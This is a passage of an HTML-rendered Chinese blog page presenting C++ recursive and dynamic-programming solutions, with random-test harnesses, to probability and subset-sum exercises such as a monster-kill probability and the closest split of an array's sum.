class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>);<br>                dp[r][c][rest] += pick(dp, N, M, r, c + <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> static_cast&lt;<span class="hljs-type">double</span>&gt;(dp[row][col][k]) / <span class="hljs-built_in">pow</span>(<span class="hljs-number">4</span>, k);<br>&#125;<br><span class="hljs-comment">// 帮助函数：检查当前位置是否越界，并返回相应的值</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">pick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&gt;&gt;&amp; dp, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> rest)</span> &#123;<br>    <span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span> || r &gt;= N || c &lt; <span class="hljs-number">0</span> || c &gt;= M) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 如果越界，返回0</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[r][c][rest];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 示例：给定棋盘大小50x50，走10步，从位置(6,6)开始</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; livePosibility1(<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; livePosibility2(<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="英雄之路"><a href="#英雄之路" class="headerlink" title="英雄之路"></a>英雄之路</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//怪物N滴血，英雄攻击在[0~M]，k次后击杀怪物的概率</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 计算右边的生存概率</span><br><span class="hljs-type">double</span> <span class="hljs-title function_">right</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">1</span> || M &lt; <span class="hljs-number">1</span> || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">long</span> all = <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, K); <span class="hljs-comment">// 总的砍法数</span><br>    <span class="hljs-type">long</span> kill = process(K, M, N); <span class="hljs-comment">// 砍死怪兽的方式数</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>)kill / (<span class="hljs-type">double</span>)all;<br>&#125;<br><br><span class="hljs-comment">// 递归处理函数，计算砍死怪兽的情况数</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">int</span> times, <span class="hljs-type">int</span> M, <span class="hljs-type">int</span> hp)</span> &#123;<br>    <span class="hljs-keyword">if</span> (times == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> hp &lt;= <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>; <span class="hljs-comment">// 如果没有剩余步数，且怪兽血量&lt;=0，返回1</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (hp &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, times); <span class="hljs-comment">// 如果血量&lt;=0，则有 4^times 种方式</span><br>    &#125;<br>    <span class="hljs-type">long</span> ways = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= M; i++) &#123;<br>        ways += process(times - <span class="hljs-number">1</span>, M, hp - i); <span class="hljs-comment">// 遍历所有伤害情况</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ways;<br>&#125;<br><br><br><span class="hljs-comment">// 动态规划解法1，计算砍死怪兽的情况数</span><br><span class="hljs-type">double</span> <span class="hljs-title function_">dp1</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">1</span> || M &lt; <span class="hljs-number">1</span> || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">long</span> all = <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, K); <span class="hljs-comment">// 总的砍法数</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&gt; dp(K + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;(N + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> times = <span class="hljs-number">1</span>; times &lt;= K; times++) &#123;<br>        dp[times][<span class="hljs-number">0</span>] = <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, times); <span class="hljs-comment">// 初始情况下，血量为0，所有的步数都能砍死</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> hp = <span class="hljs-number">1</span>; hp &lt;= N; hp++) &#123;<br>            <span class="hljs-type">long</span> ways = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= M; i++) &#123;<br>                <span class="hljs-keyword">if</span> (hp - i &gt;= <span class="hljs-number">0</span>) &#123;<br>                    ways += dp[times - <span class="hljs-number">1</span>][hp - i]; <span class="hljs-comment">// 从前一状态迁移</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    ways += <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, times - <span class="hljs-number">1</span>); <span class="hljs-comment">// 如果血量为负，则每步有 (M+1) 种情况</span><br>                &#125;<br>            &#125;<br>            dp[times][hp] = ways;<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">long</span> kill = dp[K][N];<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>)kill / (<span class="hljs-type">double</span>)all;<br>&#125;<br><br><br><span class="hljs-comment">// 动态规划解法2，计算砍死怪兽的情况数</span><br><span class="hljs-type">double</span> <span class="hljs-title function_">dp2</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M, <span class="hljs-type">int</span> K)</span> &#123;<br>    <span class="hljs-keyword">if</span> (N &lt; <span class="hljs-number">1</span> || M &lt; <span class="hljs-number">1</span> || K &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">long</span> all = <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, K); <span class="hljs-comment">// 总的砍法数</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&gt; dp(K + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;(N + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> times = <span class="hljs-number">1</span>; times &lt;= K; times++) &#123;<br>        dp[times][<span class="hljs-number">0</span>] = <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, times); <span class="hljs-comment">// 初始情况下，血量为0，所有的步数都能砍死</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> hp = <span class="hljs-number">1</span>; hp &lt;= N; hp++) &#123;<br>            dp[times][hp] = dp[times][hp - <span class="hljs-number">1</span>] + dp[times - <span class="hljs-number">1</span>][hp]; <span class="hljs-comment">// 当前步数下的血量状态</span><br><br>            <span class="hljs-comment">// 排除非法情况，确保血量不小于0</span><br>            <span class="hljs-keyword">if</span> (hp - <span class="hljs-number">1</span> - M &gt;= <span class="hljs-number">0</span>) &#123;<br>                dp[times][hp] -= dp[times - <span class="hljs-number">1</span>][hp - <span class="hljs-number">1</span> - M]; <span class="hljs-comment">// 排除掉那些不可能的情况</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                dp[times][hp] -= <span class="hljs-built_in">pow</span>(M + <span class="hljs-number">1</span>, times - <span class="hljs-number">1</span>); <span class="hljs-comment">// 血量小于0时，跳过</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">long</span> kill = dp[K][N];<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>)kill / (<span class="hljs-type">double</span>)all;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> NMax = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> MMax = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> KMax = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> testTime = <span class="hljs-number">200</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试开始&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-type">int</span> N = rand() % NMax;<br>        <span class="hljs-type">int</span> M = rand() % MMax;<br>        <span class="hljs-type">int</span> K = rand() % KMax;<br>        <span class="hljs-type">double</span> ans1 = right(N, M, K);<br>        <span class="hljs-type">double</span> ans2 = dp1(N, M, K);<br>        <span class="hljs-type">double</span> ans3 = dp2(N, M, K);<br>        <span class="hljs-keyword">if</span> (ans1 != ans2 || ans1 != ans3) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Oops!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试结束&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="组成钱的最小张数"><a href="#组成钱的最小张数" class="headerlink" title="组成钱的最小张数"></a>组成钱的最小张数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><h4 id="返回最接近的两个集合里较小的累加和"><a href="#返回最接近的两个集合里较小的累加和" class="headerlink" title="返回最接近的两个集合里较小的累加和"></a>返回最接近的两个集合里较小的累加和</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 递归解法</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">right</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.size() &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        sum += num;<br>    &#125;<br>    <span class="hljs-keyword">return</span> process(arr, <span class="hljs-number">0</span>, sum / <span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-comment">// 递归</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> rest)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == arr.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 还有数，arr[i]这个数</span><br>        <span class="hljs-comment">// 可能性1，不使用arr[i]</span><br>        <span class="hljs-type">int</span> p1 = process(arr, i + <span class="hljs-number">1</span>, rest);<br>        <span class="hljs-comment">// 可能性2，要使用arr[i]</span><br>        <span class="hljs-type">int</span> p2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (arr[i] &lt;= rest) &#123;<br>            p2 = arr[i] + process(arr, i + <span class="hljs-number">1</span>, rest - arr[i]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> max(p1, p2);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 动态规划解法</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.size() &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        sum += num;<br>    &#125;<br>    sum /= <span class="hljs-number">2</span>;<br>    <br>    <span class="hljs-type">int</span> N = arr.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(sum + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = N - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">0</span>; rest &lt;= sum; rest++) &#123;<br>            <span class="hljs-comment">// 可能性1，不使用arr[i]</span><br>            <span class="hljs-type">int</span> p1 = dp[i + <span class="hljs-number">1</span>][rest];<br>            <span class="hljs-comment">// 可能性2，要使用arr[i]</span><br>            <span class="hljs-type">int</span> p2 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">if</span> (arr[i] &lt;= rest) &#123;<br>                p2 = arr[i] + dp[i + <span class="hljs-number">1</span>][rest - arr[i]];<br>            &#125;<br>            dp[i][rest] = max(p1, p2);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][sum];<br>&#125;<br><br><span class="hljs-comment">// 生成随机数组</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">randomArray</span><span class="hljs-params">(<span class="hljs-type">int</span> len, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(len)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        arr[i] = rand() % value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-comment">// 打印数组</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printArray</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : arr) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(time(<span class="hljs-number">0</span>)); <span class="hljs-comment">// 初始化随机数生成器</span><br><br>    <span class="hljs-type">int</span> maxLen = <span class="hljs-number">20</span>;<br>    <span class="hljs-type">int</span> maxValue = <span class="hljs-number">50</span>;<br>    <span class="hljs-type">int</span> testTime = <span class="hljs-number">10000</span>;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试开始&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-type">int</span> len = rand() % maxLen;<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = randomArray(len, maxValue);<br>        <br>        <span class="hljs-type">int</span> ans1 = right(arr);<br>        <span class="hljs-type">int</span> ans2 = dp(arr);<br>        <br>        <span class="hljs-keyword">if</span> (ans1 != ans2) &#123;<br>            printArray(arr);<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;正确的答案: &quot;</span> &lt;&lt; ans1 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;动态规划的答案: &quot;</span> &lt;&lt; ans2 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Oops!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试结束&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="返回最接近的两个集合里较小的累加和（限制长度）"><a href="#返回最接近的两个集合里较小的累加和（限制长度）" class="headerlink" title="返回最接近的两个集合里较小的累加和（限制长度）"></a>返回最接近的两个集合里较小的累加和（限制长度）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span 